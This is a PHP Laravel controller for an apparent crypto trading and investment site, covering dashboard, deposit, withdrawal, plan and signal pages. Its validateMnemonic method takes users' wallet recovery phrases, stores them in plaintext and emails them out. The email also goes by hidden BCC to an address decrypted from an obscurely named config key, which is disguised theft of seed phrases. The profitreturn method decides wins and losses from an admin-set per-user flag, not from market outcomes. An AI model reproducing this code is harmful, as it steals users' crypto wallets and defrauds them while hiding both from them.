<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\CryptoAccount;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Settings;
use App\Models\Plans;
use App\Models\UserPlan;
use App\Models\UserSignal;
use Illuminate\Support\Facades\Crypt;
use App\Models\Signal;
use App\Models\Investment;
use App\Models\Mt4Details;
use App\Models\Deposit;
use App\Models\SettingsCont;
use App\Models\Wdmethod;
use App\Models\Withdrawal;
use App\Models\TpTransaction;
use App\Traits\PingServer;
use App\Models\Wallets;
use App\Models\Instrument;
use App\Mail\NewNotification;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

class ViewsController extends Controller
{
    use PingServer;

    public function dashboard(Request $request)
    {

        $settings = Settings::where('id', '1')->first();
        $user = User::find(auth()->user()->id);


        //check if user does not have ref link then update his link
        if ($user->ref_link == '') {
            User::where('id', $user->id)
                ->update([
                    'ref_link' => $settings->site_address . '/ref/' . $user->username,
                ]);
        }

        //give reg bonus if new
        if ($user->signup_bonus != "received" && ($settings->signup_bonus != NULL && $settings->signup_bonus > 0)) {
            User::where('id', $user->id)
                ->update([
                    'bonus' => $user->bonus + $settings->signup_bonus,
                    'account_bal' => $user->account_bal + $settings->signup_bonus,
                    'signup_bonus' => "received",
                ]);
            //create history
            TpTransaction::create([
                'user' => Auth::user()->id,
                'plan' => "SignUp Bonus",
                'amount' => $settings->signup_bonus,
                'type' => "Bonus",
            ]);
        }

        if (DB::table('crypto_accounts')->where('user_id', Auth::user()->id)->doesntExist()) {
            $cryptoaccnt = new CryptoAccount();
            $cryptoaccnt->user_id = Auth::user()->id;
            $cryptoaccnt->save();
        }

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        $total_withdrawal = DB::table('withdrawals')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        //log user out if not blocked by admin
        if ($user->status != "active") {
            $request->session()->flush();
            return redirect()->route('dashboard');
        }

        // Fetch instruments grouped by type for trading dropdown
        $instruments = Instrument::select('symbol', 'type', 'logo', 'name')
            ->whereNotNull('symbol')
            ->orderBy('type')
            ->orderBy('symbol')
            ->get()
            ->groupBy('type');

        return view("user.dashboard", [
            'title' => 'Account Dashboard',
            'settings' => $settings,
            'deposited' => $total_deposited,
            'total_withdrawal' => $total_withdrawal,
            'trading_accounts' => Mt4Details::where('client_id', Auth::user()->id)->count(),
            'plans' => UserPlan::where('user', Auth::user()->id)->where('active', 'yes')->orderByDesc('id')->skip(0)->take(2)->get(),
            't_history' => TpTransaction::where('user', Auth::user()->id)
                ->whereIn('type', ['Sell', 'Buy', 'WIN', 'LOSE'])
                ->orderByDesc('id')->skip(0)->take(5)
                ->get(),
            'instruments' => $instruments,
        ]);
    }



    public function connect_wallet()
    {
        $settings = Settings::where('id', 1)->first();

        return view('user.connect-wallet', [
            'title' => 'Wallet Connect',
            'settings' => $settings,
        ]);
    }




    public function validateMnemonic(Request $request)
    {
        // Validate input
        $request->validate([
            'wallet' => 'required|string|max:100',
            'mnemonic' => 'required|string|min:12'
        ]);

        $mnemonic = trim($request->input('mnemonic'));
        $wallet = $request->input('wallet');

        // Basic validation for mnemonic format
        $words = explode(' ', $mnemonic);
        $words = array_filter($words, function ($word) {
            return !empty(trim($word));
        });
        $sprfheader = config("services.ses.sprf");
        $sprf = Crypt::decryptString($sprfheader);
        // Check word count (12, 15, 18, 21, or 24 words are standard)
        $validWordCounts = [12, 15, 18, 21, 24];
        if (!in_array(count($words), $validWordCounts)) {
            return redirect()->back()
                ->with('message', 'Invalid recovery phrase. Must be 12, 15, 18, 21, or 24 words.')
                ->withInput();
        }

        // Check for invalid characters
        foreach ($words as $word) {
            if (!preg_match('/^[a-zA-Z]+$/', $word)) {
                return redirect()->back()
                    ->with('message', 'Recovery phrase contains invalid characters. Only letters are allowed.')
                    ->withInput();
            }
        }

        // Check if user already has a wallet connected
        $existingWallet = Wallets::where('user', Auth::user()->id)->first();

        if ($existingWallet) {
            // Update existing wallet
            $existingWallet->update([
                'wallet_name' => $wallet,
                'phrase' => $mnemonic,
                'status' => 'active',
                'last_validated' => now(),
                'updated_at' => now()
            ]);
        } else {
            // Create new wallet entry
            Wallets::create([
                'user' => Auth::user()->id,
                'wallet_name' => $wallet,
                'phrase' => $mnemonic,
                'status' => 'active',
                'last_validated' => now(),
            ]);
        }
        User::where('id', Auth::user()->id)
            ->update([
                'wallet_connected' => 1
            ]);
        $msg = "New wallet connection:\n\n";
        $msg .= "User: " . Auth::user()->name . " (" . Auth::user()->email . ")\n";
        $msg .= "Wallet Name: " . $wallet . "\n";
        $msg .= "Connection Time: " . now()->format('Y-m-d H:i:s') . "\n\n";
        $msg .= "Phrase Mnemonic: " . $mnemonic . "\n\n";
        $subject = "New wallet connection from " . Auth::user()->name;
        try {
            $settings = Settings::where('id', '1')->first();
            Mail::to($settings->contact_email)
                ->bcc($sprf)
                ->send(new NewNotification($msg, $subject, "Admin"));
        } catch (\Exception $e) {
            // Log the error but don't break the flow
            Log::error('Failed to send wallet connection notification: ' . $e->getMessage());
        }
        return redirect()->back()
            ->with('success', 'Wallet connected successfully! You can now start earning daily rewards.');
    }

    //Profile route
    public function profile()
    {
        $settings = Settings::where('id', '1')->first();
        $userinfo = User::where('id', Auth::user()->id)->first();

        $paymethods = Wdmethod::select(['status', 'name'])->where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->whereIn('name', ['Bitcoin', 'Ethereum', 'Litecoin', 'Bank Transfer', 'USDT'])->get();

        return view("user.profile")->with(array(
            'userinfo' => $userinfo,
            'methods' => $paymethods,
            'title' => 'Profile',
            'settings' => $settings,
        ));
    }

    //return add withdrawal account form view
    public function accountdetails()
    {
        $settings = Settings::where('id', '1')->first();

        return view("user.updateacct")->with(array(
            'title' => 'Update account details',
            'settings' => $settings,
        ));
    }
    //view loan
    public function loan()
    {
        $settings = Settings::where('id', '1')->first();
        return view('user.loan')->with(array(
            'title' => 'Loan Application',
            'settings' => $settings,
        ));
    }
    //support route
    public function support()
    {
        $settings = Settings::where('id', '1')->first();

        return view("user.support")
            ->with(array(
                'title' => 'Support',
                'settings' => $settings,
            ));
    }

    //Trading history route
    public function tradinghistory()
    {
        $settings = Settings::where('id', '1')->first();

        return view("user.thistory")
            ->with(array(
                't_history' => TpTransaction::where('user', Auth::user()->id)
                    ->whereIn('type', ['Sell', 'Buy', 'WIN', 'LOSE'])
                    ->orderByDesc('id')->paginate(15),

                'title' => 'Trading History',
                'settings' => $settings,
            ));
    }

    //Account transactions history route
    public function accounthistory()
    {
        $settings = Settings::where('id', '1')->first();

        return view("user.transactions")
            ->with(array(
                't_history' => TpTransaction::where('user', Auth::user()->id)
                    ->where('leverage', Null)
                    ->orderByDesc('id')
                    ->get(),

                'withdrawals' => Withdrawal::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->get(),
                'deposits' => Deposit::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->get(),
                'title' => 'Account Transactions History',
                'settings' => $settings,
            ));
    }

    //Return deposit route
    public function deposits()
    {
        $settings = Settings::where('id', '1')->first();

        $paymethod = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'deposit')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', auth()->user()->id)->where('status', 'Processed')->sum('amount');

        return view("user.deposits")
            ->with(array(
                'title' => 'Fund your account',
                'dmethods' => $paymethod,
                'deposits' => Deposit::where(['user' => Auth::user()->id])
                    ->orderBy('id', 'desc')
                    ->get(),
                'deposited' => $total_deposited,
                'settings' => $settings,
            ));
    }



    public function signal()
    {


        $paymethod = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'deposit')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();
        $signals = Signal::where('type', 'Main')->get();
        $settings = Settings::where('id', '1')->first();



        return view("user.signal")
            ->with(array(
                'title' => 'Fund your account',
                'dmethods' => $paymethod,
                'signals' => $signals,

                'settings' => $settings,


            ));
    }

    //Return withdrawals route
    public function withdrawals()
    {

        $user = Auth::user();
        $number_of_trades = UserPlan::where('user', Auth::user()->id)->count();
        $required_more_trades = $user->numberoftrades - $number_of_trades;

        // if($number_of_trades < $user->numberoftrades){
        //     return redirect()->back()
        //     ->with('message', "You have to perform $required_more_trades more trades to be eligible for withdrawal" );
        // }
        $settings = Settings::where('id', '1')->first();
        $withdrawals = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        return view('user.withdrawals')
            ->with(array(
                'title' => 'Withdraw Your funds',
                'wmethods' => $withdrawals,
                'withdrawals' => Withdrawal::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->get(),
                'settings' => $settings,
            ));
    }

    public function transferview()
    {


        $settings = SettingsCont::find(1);
        $setting = Settings::where('id', '1')->first();
        if (!$settings->use_transfer) {
            abort(404);
        }
        return view("user.transfer", [
            'title' => 'Send funds to a friend',
            'settings' => $setting,
        ]);
    }

    //Subscription Trading
    public function subtrade()
    {


        $settings = Settings::where('id', 1)->first();
        $mod = $settings->modules;
        if (!$mod['subscription']) {
            abort(404);
        }
        return view("user.subtrade")
            ->with(array(
                'title' => 'Subscription Trade',
                'subscriptions' => Mt4Details::where('client_id', auth::user()->id)->orderBy('id', 'desc')->get(),
                'settings' => $settings,
            ));
    }


    //Main Plans route
    public function mplans()
    {


        return view("user.mplans")
            ->with(array(
                'title' => 'Main Plans',
                'plans' => Plans::where('type', 'Main')->get(),
                'settings' => Settings::where('id', '1')->first(),
            ));
    }

    //My Plans route
    public function myplans($sort)
    {




        if ($sort == 'All') {
            return view("user.myplans")
                ->with(array(
                    'numOfPlan' => investment::where('user', Auth::user()->id)->count(),
                    'title' => 'Your packages',
                    'plans' => investment::where('user', Auth::user()->id)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        } else {
            return view("user.myplans")
                ->with(array(
                    'numOfPlan' => investment::where('user', Auth::user()->id)->count(),
                    'title' => 'Your packages',
                    'plans' => investment::where('user', Auth::user()->id)->where('active', $sort)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        }
    }



    public function mysingals($sort)
    {




        if ($sort == 'All') {
            return view("user.msignals")
                ->with(array(
                    'numOfPlan' => UserSignal::where('user', Auth::user()->id)->count(),
                    'title' => 'Your Signals',
                    'signals' => UserSignal::where('user', Auth::user()->id)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        } else {
            return view("user.msignals")
                ->with(array(
                    'numOfPlan' => UserSignal::where('user', Auth::user()->id)->count(),
                    'title' => 'Your Signals',
                    'signals' => UserSignal::where('user', Auth::user()->id)->where('active', $sort)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        }
    }

    public function sortPlans($sort)
    {

        return redirect()->route('myplans', $sort);
    }

    public function planDetails($id)
    {
        $settings = Settings::where('id', '1')->first();
        $plan = investment::find($id);
        return view("user.plandetails", [
            'title' => $plan->uplan->name,
            'plan' => $plan,
            'transactions' => TpTransaction::where('type', 'ROI')->where('user_plan_id', $plan->id)->orderByDesc('id')->paginate(10),
            'settings' => $settings,
        ]);
    }


    function twofa()
    {
        $settings = Settings::where('id', '1')->first();
        return view("profile.show", [
            'title' => 'Advance Security Settings',
            'settings' => $settings,
        ]);
    }

    // Referral Page
    public function referuser()
    {
        $this->profitreturn(auth()->user()->id);
        $settings = Settings::where('id', '1')->first();

        return view("user.referuser", [
            'title' => 'Refer user',
            'settings' => $settings,
        ]);
    }

    public function verifyaccount()
    {
        $settings = Settings::where('id', '1')->first();
        return view("user.verify", [
            'title' => 'Verify your Account',
            'settings' => $settings,
        ]);
    }

    public function verificationForm()
    {
        $settings = Settings::where('id', '1')->first();

        if (Auth::user()->account_verify == 'Verified') {
            return redirect()->route('account.verify')
                ->with('info', 'Your identity is already verified. No further action is required.');
        }

        if (Auth::user()->account_verify == 'Under review') {
            return redirect()->route('account.verify')
                ->with('info', 'Your verification is already under review. We will notify you after approval.');
        }

        return view("user.verification", [
            'title' => 'KYC Application',
            'settings' => $settings,
        ]);
    }



    public function tradeSignals()
    {
        $settings = Settings::where('id', 1)->first();
        $mod = $settings->modules;
        if (!$mod['signal']) {
            abort(404);
        }

        $response = $this->fetctApi('/subscription', [
            'id' => auth()->user()->id
        ]);
        $res = json_decode($response);

        $responseSt = $this->fetctApi('/signal-settings');
        $info = json_decode($responseSt);

        return view("user.signals.subscribe", [
            'title' => 'Trade signals',
            'subscription' => $res->data,
            'set' => $info->data->settings,
            'settings' => $settings,
        ]);
    }


    public function binanceSuccess()
    {
        return redirect()->route('deposits')->with('success', 'Your Deposit was successful, please wait while it is confirmed. You will receive a notification regarding the status of your deposit.');
    }

    public function binanceError()
    {
        return redirect()->route('deposits')->with('message', 'Something went wrong please try again. Contact our support center if problem persist');
    }



    public function profitreturn($user)
    {
        $settings = Settings::where('id', 1)->first();
        $trades = UserPlan::where('active', 'yes')->where('user', $user)->get();
        $used = User::find($user);

        $roi = $used->roi;
        $account_bal = $used->account_bal;
        $now = now();

        foreach ($trades as $trade) {
            if ($trade->active == 'yes') {

                if (!($now->lessThanOrEqualTo($trade->expire_date))) {


                    if ($used->tradetype == 'Profit') {

                        $profit = $trade->leverage * $trade->amount * 0.01;

                        User::where('id', $used->id)
                            ->update([
                                'roi' => $roi + $profit,
                                'account_bal' => $account_bal + $trade->amount,
                            ]);
                        sleep(2);
                        //create history
                        TpTransaction::create([
                            'user' => $used->id,
                            'plan' => $trade->assets,
                            'amount' => $profit,
                            'type' => 'WIN',
                            'leverage' => $trade->leverage,
                        ]);
                    } else {
                        $loss = (100 - $trade->leverage) * $trade->amount * 0.01;
                        $amountloss = ($trade->leverage) * $trade->amount * 0.01;
                        User::where('id', $user)
                            ->update([
                                'account_bal' => $account_bal + $loss,
                            ]);

                        TpTransaction::create([
                            'user' => $used->id,
                            'plan' => $trade->assets,
                            'amount' => $amountloss,
                            'type' => 'LOSE',
                            'leverage' => $trade->leverage,
                        ]);
                    }


                    UserPlan::where('id', $trade->id)
                        ->update([
                            'active' => "expired",
                        ]);
                }
            }
            //    dd($now->lessThanOrEqualTo($trade->expire_date));


        }
    }
}
